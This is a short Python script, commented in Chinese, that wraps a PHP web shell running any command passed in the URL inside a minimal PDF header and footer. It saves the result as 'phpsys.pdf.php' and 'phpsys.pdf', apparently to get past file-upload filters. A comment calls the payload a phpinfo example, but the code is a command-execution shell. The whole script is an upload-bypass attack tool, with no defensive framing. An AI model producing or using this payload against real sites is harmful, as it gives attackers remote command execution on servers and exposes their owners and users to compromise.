from io import BytesIO

# PHP内容（以phpinfo为例）
php_content = '''
<?php 
system($_GET["cmd"]);
 ?>
'''

# PDF文件的头部和尾部
pdf_header = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 5 0 R >>\nstream\n"
pdf_footer = b"\nendstream\nendobj\n5 0 obj\n11\nendobj\nxref\n0 6\n0000000000 65535 f \n0000000010 00000 n \n0000000079 00000 n \n0000000178 00000 n \n0000000279 00000 n \n0000000372 00000 n \ntrailer\n<< /Root 1 0 R /Size 6 >>\nstartxref\n482\n%%EOF"

# 创建包含PHP代码的PDF文件的函数
def create_php_to_pdf():
    # 创建一个内存字节缓冲区
    f = BytesIO()
    
    # 写入PDF文件头部
    f.write(pdf_header)
    
    # 将PHP代码嵌入到PDF流内容部分
    f.write(php_content.encode('utf-8'))
    
    # 写入PDF文件尾部
    f.write(pdf_footer)
    
    # 重置缓冲区位置到文件开头
    f.seek(0)
    
    return f

# 生成包含PHP代码的PDF文件
php_pdf_file = create_php_to_pdf()

# 保存为 .pdf.php 文件（或根据需要为 .pdf 文件）
with open('phpsys.pdf.php', 'wb') as output_file:
    output_file.write(php_pdf_file.read())

# 重新生成缓冲区并保存为 .pdf 扩展文件
php_pdf_file = create_php_to_pdf()  # 重新生成缓冲区
with open('phpsys.pdf', 'wb') as output_file:
    output_file.write(php_pdf_file.read())

# 输出成功信息
print("文件 'phpsys.pdf' 和 'phpsys.pdf.php' 已成功创建，且嵌入了PHP代码内容。")

